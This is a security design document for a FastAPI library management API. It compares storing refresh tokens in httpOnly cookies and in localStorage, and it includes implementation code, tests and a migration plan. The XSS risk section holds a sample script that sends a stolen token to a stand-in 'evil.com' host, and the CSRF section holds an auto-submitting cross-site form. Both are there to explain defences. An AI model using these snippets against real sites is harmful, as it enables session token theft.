# Refresh Token Storage: httpOnly Cookies vs localStorage

**Date:** 2025-01-11
**Status:** Analysis Complete - Implementation Decision Pending
**Current Implementation:** localStorage (response body)

---

## Executive Summary

This document analyzes two approaches for storing refresh tokens in a web application:
1. **httpOnly Cookies** - Browser-managed, JavaScript-inaccessible
2. **localStorage** - JavaScript-managed, explicit control

**Recommendation:** Implement httpOnly cookies with CSRF protection for better XSS defense in our web-focused library management system.

---

## Security Comparison Matrix

| Attack Vector | httpOnly Cookies | localStorage (Current) |
|---------------|------------------|------------------------|
| **XSS (Cross-Site Scripting)** | ✅ **Protected** - JS can't access | ❌ **Vulnerable** - JS can read/steal |
| **CSRF (Cross-Site Request Forgery)** | ❌ **Vulnerable** - Auto-sending | ✅ **Protected** - Manual sending |
| **Man-in-the-Middle** | ⚠️ Needs `Secure` flag (HTTPS) | ⚠️ Needs HTTPS |
| **Token Leakage in Logs** | ✅ Less likely (not in URLs) | ⚠️ Possible if logged |
| **Browser DevTools Inspection** | ✅ Hidden from Application tab | ❌ Visible in Application tab |

---

## Detailed Analysis

### Option 1: httpOnly Cookies (Recommended)

#### Advantages
1. **XSS Protection** - Even if attacker injects malicious JavaScript, they cannot steal the refresh token
2. **Automatic Management** - Browser handles sending, storage, and expiration
3. **Industry Standard** - Used by Auth0, Firebase, AWS Cognito for web applications
4. **No JavaScript Access** - Strongest protection against script-based token theft
5. **Immune to Client-Side Storage Exploits** - Can't be accessed via `window.localStorage`, `window.sessionStorage`

#### Disadvantages
1. **CSRF Vulnerability** - Requires additional CSRF token implementation
2. **Mobile/Desktop App Complexity** - Cookies are browser-specific, harder to implement in native apps
3. **Subdomain/Domain Issues** - Complex configuration for microservices on different domains
4. **CORS Complications** - Requires `credentials: 'include'` and proper CORS setup
5. **Testing Complexity** - Can't easily inspect cookies in some dev tools

#### Implementation Requirements
```python
# Set cookie with security flags
response.set_cookie(
    key="refresh_token",
    value=refresh_token,
    httponly=True,      # JavaScript can't access
    secure=True,        # HTTPS only
    samesite="strict",  # CSRF protection
    max_age=2592000,    # 30 days
    path="/auth/refresh"  # Only sent to refresh endpoint
)
```

---

### Option 2: localStorage (Current Implementation)

#### Advantages
1. **CSRF-Resistant** - No automatic sending, must explicitly include in requests
2. **Simple for API Clients** - Works great for SPAs, mobile apps, desktop apps
3. **Cross-Domain Friendly** - Easier for microservices architecture
4. **Developer-Friendly** - Easy to inspect in browser DevTools
5. **Full Control** - Application decides when and how to send tokens
6. **No CORS Complications** - Standard fetch requests work normally

#### Disadvantages
1. **XSS Vulnerability** - If attacker injects JavaScript, they can steal tokens
2. **Developer Responsibility** - Must implement token management correctly
3. **Visible in DevTools** - Anyone with access to browser can view tokens
4. **No Built-in Expiration** - Must implement cleanup manually

#### Current Implementation
```python
# Response body includes refresh token
return {
    "access_token": access_token,
    "refresh_token": refresh_token,  # Client stores in localStorage
    "token_type": "bearer",
    "expires": access_expires,
}
```

---

## Real-World Risk Assessment

### XSS Risk (localStorage Vulnerability)

**Severity:** **HIGH** if XSS vulnerabilities exist

**Attack Scenario:**
```javascript
// Attacker injects this via XSS
const token = localStorage.getItem('refresh_token');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

**Mitigation Strategies:**
- ✅ Use modern frameworks (React, Vue, Angular) that escape output by default
- ✅ Implement Content Security Policy (CSP) headers
- ✅ Sanitize all user input server-side
- ✅ Regular security audits and penetration testing
- ✅ Use HTTPS only to prevent injection via MITM

**Reality Check:**
If an attacker can execute XSS, they can:
- Steal localStorage tokens ✓
- Steal non-httpOnly cookies ✓
- Keylog user passwords ✓
- Make authenticated requests even with httpOnly cookies ✓

---

### CSRF Risk (httpOnly Cookie Vulnerability)

**Severity:** **MODERATE** with proper protections

**Attack Scenario:**
```html
<!-- Evil site makes request to your API -->
<form action="https://yourapi.com/auth/refresh" method="POST">
  <!-- Browser automatically sends cookies -->
</form>
<script>document.forms[0].submit()</script>
```

**Mitigation Strategies:**
1. **SameSite=Strict Cookies** (Primary Defense)
   ```python
   response.set_cookie(..., samesite="strict")
   ```
   Blocks most CSRF by preventing cross-site cookie sending

2. **CSRF Tokens** (Secondary Defense)
   ```python
   # Generate on login, validate on sensitive operations
   csrf_token = secrets.token_urlsafe(32)
   ```

3. **Origin Header Validation**
   ```python
   if request.headers.get("origin") not in ALLOWED_ORIGINS:
       raise HTTPException(403)
   ```

4. **Custom Headers**
   ```python
   # Requires custom header that CSRF can't set
   x_csrf_token: str = Header(...)
   ```

---

## Application Context Analysis

### Current Application Profile
- **Type:** Library Management System (Maktaba API)
- **Architecture:** FastAPI backend + separate SPA frontend
- **Frontend Locations:**
  - `http://localhost:3000` (development)
  - `http://localhost:5173` (development)
  - `https://maktaba-frontend.onrender.com` (production)
- **User Data:** Patron information, checkout history, fines (sensitive)
- **Clients:** Primarily web browsers (SPA), potentially mobile apps future

### Risk Profile
- **XSS Risk:** Medium-High (user-generated content in library system)
- **CSRF Risk:** Medium (can be mitigated with SameSite=Strict)
- **Data Sensitivity:** High (personal information, financial data)

---

## Recommendation: httpOnly Cookies + CSRF Protection

### Decision Rationale
1. ✅ **Better Security Posture** - XSS is more common than CSRF in modern web apps
2. ✅ **Frontend is Separate** - Already dealing with CORS, cookie setup is manageable
3. ✅ **Web-Focused** - Not a mobile app (yet), so cookie limitations don't apply
4. ✅ **User Data Protection** - Library system contains sensitive patron data
5. ✅ **Industry Best Practice** - Aligns with recommendations from OWASP, Auth0, etc.

### Implementation Effort Estimate
- **Model Changes:** 1 hour (add `csrf_token_hash` field)
- **Authentication Logic:** 2 hours (CSRF token generation/validation)
- **Endpoint Updates:** 2 hours (login, refresh, logout)
- **Testing:** 2 hours (update existing tests, add CSRF tests)
- **Documentation:** 1 hour
- **Total:** 8 hours

---

## Implementation Guide

### 1. Update RefreshToken Model

```python
# app/src/models/refresh_tokens.py

class RefreshToken(SQLModel, table=True):
    __tablename__ = "refresh_tokens"

    id: int | None = Field(default=None, primary_key=True)
    user_id: int = Field(foreign_key="user.id", index=True)
    token_hash: str = Field(index=True, unique=True)
    csrf_token_hash: Optional[str] = Field(default=None)  # NEW FIELD
    device_name: Optional[str] = Field(default=None, max_length=255)
    ip_address: Optional[str] = Field(default=None, max_length=45)
    user_agent: Optional[str] = Field(default=None, max_length=512)
    created_at: datetime = Field(
        default_factory=lambda: datetime.now(timezone.utc), nullable=False
    )
    expires_at: datetime = Field(nullable=False)
    last_used_at: Optional[datetime] = Field(default=None)
    is_revoked: bool = Field(default=False, index=True)
    revoked_at: Optional[datetime] = Field(default=None)
```

**Migration Required:** Yes - add `csrf_token_hash` column

---

### 2. Add CSRF Token Management

```python
# app/core/authentication.py

async def store_csrf_token(db: Session, user_id: int, csrf_token: str):
    """
    Store CSRF token hash with the latest refresh token.

    Args:
        db: Database session
        user_id: User ID
        csrf_token: Plain CSRF token to hash and store
    """
    from app.src.models.refresh_tokens import RefreshToken

    # Get latest non-revoked refresh token
    result = await db.exec(
        select(RefreshToken)
        .where(
            RefreshToken.user_id == user_id,
            RefreshToken.is_revoked.is_(False)
        )
        .order_by(RefreshToken.created_at.desc())
    )
    token = result.first()

    if token:
        token.csrf_token_hash = hash_token(csrf_token)
        db.add(token)
        await db.commit()


async def verify_csrf_token(db: Session, user_id: int, csrf_token: str) -> bool:
    """
    Verify CSRF token against stored hash.

    Args:
        db: Database session
        user_id: User ID
        csrf_token: Plain CSRF token to verify

    Returns:
        True if valid, False otherwise
    """
    from app.src.models.refresh_tokens import RefreshToken

    result = await db.exec(
        select(RefreshToken)
        .where(
            RefreshToken.user_id == user_id,
            RefreshToken.is_revoked.is_(False)
        )
        .order_by(RefreshToken.created_at.desc())
    )
    token = result.first()

    if not token or not token.csrf_token_hash:
        return False

    return pwd_context.verify(csrf_token, token.csrf_token_hash)
```

---

### 3. Update Login Endpoint

```python
# app/src/routes/auth.py

import secrets
from fastapi import Response

@router.post("/login")
async def login(
    response: Response,
    request: Request,
    form_data: Annotated[OAuth2PasswordRequestForm, Depends()],
    session: SessionDep,
    remember_me: bool = False,
):
    user = await get_user(session, form_data.username)
    if not user or not verify_password(form_data.password, user.password):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Incorrect username or password",
        )

    # Create access token (short-lived)
    result = create_access_token(data={"sub": user.username})
    access_token, access_expires = result.values()

    # Create refresh token (long-lived, stored in database)
    refresh_token, refresh_expires = await create_refresh_token(
        db=session, user_id=user.id, request=request, remember_me=remember_me
    )

    # Generate CSRF token
    csrf_token = secrets.token_urlsafe(32)
    await store_csrf_token(session, user.id, csrf_token)

    # Set httpOnly cookie for refresh token
    max_age = 7776000 if remember_me else 2592000  # 90 or 30 days
    response.set_cookie(
        key="refresh_token",
        value=refresh_token,
        httponly=True,           # JavaScript can't access
        secure=True,             # HTTPS only (use False for local dev)
        samesite="strict",       # CSRF protection
        max_age=max_age,
        path="/auth/refresh",    # Only sent to refresh endpoint
    )

    return {
        "access_token": access_token,
        "token_type": "bearer",
        "user": user,
        "expires": access_expires,
        "csrf_token": csrf_token,  # Frontend stores in localStorage
        "refresh_expires": refresh_expires.strftime("%Y-%m-%d %H:%M:%S"),
    }
```

---

### 4. Update Refresh Endpoint

```python
# app/src/routes/auth.py

@router.post("/refresh")
async def refresh_access_token(
    request: Request,
    session: SessionDep,
    x_csrf_token: str = Header(..., alias="X-CSRF-Token"),
):
    """
    Exchange a valid refresh token for a new access token.
    Requires both refresh token (cookie) and CSRF token (header).
    """
    # Get refresh token from httpOnly cookie
    refresh_token = request.cookies.get("refresh_token")
    if not refresh_token:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="No refresh token provided",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # Verify refresh token
    token_record = await verify_and_get_refresh_token(session, refresh_token)
    if not token_record:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired refresh token",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # Verify CSRF token
    is_valid_csrf = await verify_csrf_token(session, token_record.user_id, x_csrf_token)
    if not is_valid_csrf:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Invalid CSRF token",
        )

    # Get the user associated with this token
    user = await session.get(User, token_record.user_id)
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="User not found",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # Create new access token
    result = create_access_token(data={"sub": user.username})
    access_token, expires = result.values()

    return {
        "access_token": access_token,
        "token_type": "bearer",
        "expires": expires,
    }
```

---

### 5. Update Logout Endpoint

```python
# app/src/routes/auth.py

@router.post("/logout")
async def logout(
    request: Request,
    response: Response,
    session: SessionDep,
    current_user: Annotated[User, Depends(get_current_user)],
):
    """
    Logout the user by revoking refresh token and clearing cookie.
    """
    # Get refresh token from cookie
    refresh_token = request.cookies.get("refresh_token")

    if refresh_token:
        # Revoke specific token
        token_record = await verify_and_get_refresh_token(session, refresh_token)
        if token_record and token_record.user_id == current_user.id:
            await revoke_refresh_token(session, token_record.id)

    # Clear cookie regardless
    response.delete_cookie(
        key="refresh_token",
        path="/auth/refresh",
        secure=True,
        httponly=True,
        samesite="strict"
    )

    return {"message": "Logged out successfully"}
```

---

### 6. Update CORS Configuration

```python
# app/main.py

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:3000",
        "http://localhost:5173",
        "https://maktaba-frontend.onrender.com"
    ],
    allow_credentials=True,  # REQUIRED for cookies!
    allow_methods=["*"],
    allow_headers=["*"],
)
```

---

### 7. Frontend Integration Changes

```javascript
// Login
const response = await fetch('http://localhost:8000/auth/login', {
  method: 'POST',
  credentials: 'include',  // IMPORTANT: Send cookies
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: new URLSearchParams({
    username: 'user',
    password: 'pass'
  })
});

const data = await response.json();

// Store CSRF token and access token (NOT refresh token - it's in httpOnly cookie)
localStorage.setItem('csrf_token', data.csrf_token);
localStorage.setItem('access_token', data.access_token);

// Refresh access token
const refreshResponse = await fetch('http://localhost:8000/auth/refresh', {
  method: 'POST',
  credentials: 'include',  // Send cookies (refresh token)
  headers: {
    'X-CSRF-Token': localStorage.getItem('csrf_token')  // Send CSRF token
  }
});

const newTokenData = await refreshResponse.json();
localStorage.setItem('access_token', newTokenData.access_token);

// Logout
await fetch('http://localhost:8000/auth/logout', {
  method: 'POST',
  credentials: 'include',  // Send cookies
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('access_token')}`
  }
});

// Clear local storage
localStorage.removeItem('csrf_token');
localStorage.removeItem('access_token');
```

---

## Alternative: Hybrid Approach

Allow client to choose storage method:

```python
@router.post("/login")
async def login(
    response: Response,
    request: Request,
    form_data: Annotated[OAuth2PasswordRequestForm, Depends()],
    session: SessionDep,
    remember_me: bool = False,
    use_cookies: bool = True,  # New parameter
):
    # ... authentication logic ...

    if use_cookies:
        # httpOnly cookie approach
        response.set_cookie("refresh_token", refresh_token, httponly=True, ...)
        return {
            "access_token": access_token,
            "csrf_token": csrf_token,
            "token_type": "bearer",
            "user": user,
            "expires": access_expires,
        }
    else:
        # localStorage approach (backward compatibility)
        return {
            "access_token": access_token,
            "refresh_token": refresh_token,  # In response body
            "token_type": "bearer",
            "user": user,
            "expires": access_expires,
        }
```

**Benefits:**
- Backward compatibility with existing clients
- Mobile apps can use localStorage approach
- Web apps can use httpOnly cookies
- Gradual migration path

---

## Testing Strategy

### Unit Tests

```python
# app/src/tests/test_refresh_tokens_cookies.py

class TestHttpOnlyCookieRefresh:
    """Tests for httpOnly cookie-based refresh tokens"""

    def test_login_sets_httponly_cookie(self, unauthenticated_client, valid_credentials):
        """Test that login sets httpOnly cookie"""
        response = unauthenticated_client.post("/auth/login", data=valid_credentials)

        assert response.status_code == 200
        assert "refresh_token" in response.cookies

        # Verify cookie attributes
        cookie = response.cookies["refresh_token"]
        assert cookie["httponly"] is True
        assert cookie["secure"] is True
        assert cookie["samesite"] == "strict"

    def test_refresh_requires_csrf_token(self, authenticated_client):
        """Test that refresh endpoint requires CSRF token"""
        # Login to get cookies
        login_response = authenticated_client.post("/auth/login", data=credentials)

        # Try refresh without CSRF token
        response = authenticated_client.post("/auth/refresh")
        assert response.status_code == 422  # Missing required header

        # Try with invalid CSRF token
        response = authenticated_client.post(
            "/auth/refresh",
            headers={"X-CSRF-Token": "invalid_token"}
        )
        assert response.status_code == 403

    def test_csrf_protection_prevents_cross_site_requests(self):
        """Test that CSRF token protects against cross-site requests"""
        # Simulate attacker site making request (no CSRF token)
        response = client.post(
            "/auth/refresh",
            # Cookies are sent automatically by browser
            # But attacker can't access CSRF token from localStorage
        )
        assert response.status_code == 403
```

### Integration Tests

```python
def test_full_authentication_flow_with_cookies(client):
    """Test complete auth flow with httpOnly cookies"""
    # Login
    login_response = client.post("/auth/login", data=credentials)
    assert login_response.status_code == 200

    csrf_token = login_response.json()["csrf_token"]

    # Refresh
    refresh_response = client.post(
        "/auth/refresh",
        headers={"X-CSRF-Token": csrf_token}
    )
    assert refresh_response.status_code == 200

    # Logout
    logout_response = client.post("/auth/logout")
    assert logout_response.status_code == 200

    # Verify cookie is cleared
    assert "refresh_token" not in logout_response.cookies

    # Try to refresh after logout
    refresh_after_logout = client.post(
        "/auth/refresh",
        headers={"X-CSRF-Token": csrf_token}
    )
    assert refresh_after_logout.status_code == 401
```

---

## Security Checklist

Before deploying to production:

- [ ] Enable `secure=True` for all cookies (HTTPS only)
- [ ] Set `samesite="strict"` on refresh token cookies
- [ ] Implement Content Security Policy (CSP) headers
- [ ] Add rate limiting on `/auth/refresh` endpoint (e.g., 10 requests/minute)
- [ ] Configure CORS to only allow specific origins
- [ ] Enable `allow_credentials=True` in CORS middleware
- [ ] Audit all user input for XSS vulnerabilities
- [ ] Implement proper error handling (don't leak info in error messages)
- [ ] Set up monitoring/alerting for suspicious auth patterns
- [ ] Document frontend integration requirements
- [ ] Test with various browsers (Chrome, Firefox, Safari, Edge)
- [ ] Test CORS with actual frontend domain
- [ ] Verify cookies work across all allowed origins

---

## Performance Considerations

### Database Impact

**Current (localStorage):**
- 1 DB query on login (create refresh token)
- 1 DB query on refresh (verify token)
- Minimal DB load

**Proposed (httpOnly + CSRF):**
- 2 DB queries on login (create token + store CSRF)
- 2 DB queries on refresh (verify token + verify CSRF)
- ~100ms additional latency per auth operation

**Mitigation:**
- Use database indexes on `user_id` and `csrf_token_hash` columns
- Consider Redis cache for CSRF tokens (reduces DB queries)
- Batch CSRF token operations with refresh token operations

### Example Redis Implementation

```python
# Alternative: Store CSRF tokens in Redis for better performance
import redis.asyncio as redis

redis_client = redis.Redis(host='localhost', port=6379, db=0)

async def store_csrf_token_redis(user_id: int, csrf_token: str):
    """Store CSRF token in Redis with 30-day expiry"""
    key = f"csrf:{user_id}"
    await redis_client.setex(
        key,
        timedelta(days=30),
        hash_token(csrf_token)
    )

async def verify_csrf_token_redis(user_id: int, csrf_token: str) -> bool:
    """Verify CSRF token from Redis"""
    key = f"csrf:{user_id}"
    stored_hash = await redis_client.get(key)

    if not stored_hash:
        return False

    return pwd_context.verify(csrf_token, stored_hash.decode())
```

---

## Migration Path

### Phase 1: Add Cookie Support (Backward Compatible)
1. Add `csrf_token_hash` column to database
2. Implement cookie-based endpoints alongside existing endpoints
3. Keep returning refresh tokens in response body
4. Test thoroughly

### Phase 2: Encourage Migration
1. Update frontend to use cookie-based approach
2. Document migration guide for API consumers
3. Add deprecation warnings to old endpoints
4. Monitor usage metrics

### Phase 3: Full Migration (3-6 months later)
1. Remove refresh token from response body
2. Make cookie-based auth mandatory
3. Update all documentation
4. Announce via release notes

---

## References

### Standards & Best Practices
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [RFC 6749 - OAuth 2.0](https://datatracker.ietf.org/doc/html/rfc6749)
- [RFC 6750 - OAuth 2.0 Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)

### Industry Implementations
- [Auth0 Refresh Token Security](https://auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation)
- [Firebase Authentication](https://firebase.google.com/docs/auth/web/manage-users)
- [AWS Cognito Token Handling](https://docs.aws.amazon.com/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-with-identity-providers.html)

### Technical Articles
- [The Ultimate Guide to handling JWTs on frontend clients](https://hasura.io/blog/best-practices-of-using-jwt-with-graphql/)
- [Stop using JWT for sessions](http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/)
- [SameSite Cookie Explained](https://web.dev/samesite-cookies-explained/)

---

## Appendix: Cookie Flags Explained

### httpOnly
```python
httponly=True
```
**Purpose:** Prevents JavaScript access to cookie
**Protects Against:** XSS attacks that try to steal tokens
**Trade-off:** Can't read cookie value client-side for debugging

### secure
```python
secure=True
```
**Purpose:** Only send cookie over HTTPS
**Protects Against:** Man-in-the-middle attacks intercepting tokens
**Trade-off:** Must use HTTPS (use `False` for local development)

### samesite
```python
samesite="strict"  # or "lax" or "none"
```
**Purpose:** Controls when cookies are sent in cross-site requests

**Options:**
- `strict` - Never send on cross-site requests (best security, may break some flows)
- `lax` - Send on top-level navigation (e.g., clicking link, good balance)
- `none` - Always send (requires `secure=True`, needed for third-party contexts)

**Recommendation:** Use `strict` for refresh tokens since they should only be sent to `/auth/refresh`

### path
```python
path="/auth/refresh"
```
**Purpose:** Only send cookie to specific paths
**Protects Against:** Unnecessary cookie exposure
**Trade-off:** More secure but less flexible

### max_age
```python
max_age=2592000  # 30 days in seconds
```
**Purpose:** Cookie expiration time
**Note:** Should match refresh token database expiration

---

## Decision Log

| Date | Decision | Rationale |
|------|----------|-----------|
| 2025-01-11 | Recommend httpOnly cookies | Better XSS protection, aligns with best practices |
| TBD | Implementation approval | Pending stakeholder review |
| TBD | Migration schedule | To be determined based on development priorities |

---

**Document Version:** 1.0
**Last Updated:** 2025-01-11
**Next Review:** After implementation or 3 months
